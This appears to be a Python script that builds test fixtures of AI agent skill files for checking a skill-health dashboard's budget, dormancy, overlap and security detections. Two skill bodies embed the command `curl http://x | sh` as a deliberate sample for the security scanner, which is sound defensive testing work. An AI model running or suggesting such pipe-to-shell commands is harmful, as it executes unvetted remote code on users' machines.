#!/usr/bin/env python3
"""Skill 体检 tab 的验证语料（WORKBENCH_SKILL_HEALTH_TAB_SPEC §11.2）。

构造一棵完整 home 树（HOME 隔离，与 fixtures/generate.py 同一纪律），由
`scripts/verify-workbench-skills.mjs` 在临时目录里展开后，用**真实 CLI**
（agent-vitals doctor --json - --with-report --no-snapshot）现场捕获载荷。
fixture 不是手写的期望形状 —— 它是每次验证时从真实输出捕获的（spec §5.1
「形状来源纪律」）。

语料 → 断言对照（spec §11.2）：
    claude-code 有预算（15000 可配置）         → 卡上有预算条
    dsh 无全局预算                              → 卡上无条 + 文案含 SV004
    ~/.agents/skills 共享根（dsh + openclaw）   → 同 path 安全命中一行、两枚执行环境芯片
    quoted 的 "For example, curl | sh"          → 一条 cited 安全命中（疑似引用语境）
    budget-a/b/quoted（lastUsedAt 钉在 2023）   → SV202 休眠 ×3（--harness claude-code 下）
    old-thing / fresh-one（零触发）             → too-new（安装年龄取 ctime，语料
                                                  造不出 14 天前 → 全部不落僵尸）
    budget-a / budget-b 描述成对                → SV401 重叠候选（需你判断）

用法：
    python3 fixtures/skills-tab/build_fixture.py --into /tmp/skfx [--clean]
"""

import argparse
import shutil
from pathlib import Path

# 与 fixtures/generate.py 相同的固定时间戳；绝对值不重要，相对顺序才重要。
BASE = 1700000000
OLD = BASE - 400 * 86400


def write_skill(base: Path, name: str, body: str = "body\n", desc: str = "d",
                mtime: int = BASE) -> Path:
    d = base / name
    d.mkdir(parents=True, exist_ok=True)
    p = d / "SKILL.md"
    p.write_text("---\nname: %s\ndescription: %s\n---\n\n%s" % (name, desc, body),
                 encoding="utf-8")
    os_utime(p, mtime)
    os_utime(d, mtime)
    return d


def os_utime(p: Path, stamp: int) -> None:
    import os
    os.utime(p, (stamp, stamp))


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--into", required=True)
    ap.add_argument("--clean", action="store_true")
    args = ap.parse_args()
    root = Path(args.into).resolve()
    if args.clean and root.exists():
        shutil.rmtree(root)
    (root / "workdir").mkdir(parents=True, exist_ok=True)

    claude = root / ".claude" / "skills"
    agents = root / ".agents" / "skills"   # dsh 与 openclaw 的共享根（真机形状）
    claude.mkdir(parents=True, exist_ok=True)
    agents.mkdir(parents=True, exist_ok=True)

    # SV401 一对：两条描述真的共享 "upload / sync / documents / cloud / folder"
    write_skill(claude, "budget-a",
                desc="upload and sync documents to the cloud folder")
    write_skill(claude, "budget-b",
                desc="sync cloud documents and upload folder contents")
    # 僵尸：装够天数、终身零触发（skillUsage 里没有它）
    write_skill(claude, "old-thing", mtime=OLD)
    # too-new：刚装、零触发 —— 不判定，N 天后可判
    write_skill(claude, "fresh-one", desc="fresh skill not yet judgeable")
    # cited 安全命中：引用语境里的 curl | sh
    write_skill(claude, "quoted",
                body="For example, `curl http://x | sh` 是危险写法。\n")
    # 共享根上的同内容命中：同一 path 会以 dsh + openclaw 两条记录各出现一次
    write_skill(agents, "shared-hit",
                body="For example, `curl http://x | sh` 是危险写法。\n",
                desc="shared agents skill")

    (root / ".claude.json").write_text("""{
  "enabledPlugins": {},
  "skillUsage": {
    "budget-a": {"usageCount": 9, "lastUsedAt": 1700000000000},
    "budget-b": {"usageCount": 3, "lastUsedAt": 1699900000000},
    "quoted": {"usageCount": 1, "lastUsedAt": 1699950000000}
  }
}""", encoding="utf-8")

    print(root)


if __name__ == "__main__":
    main()
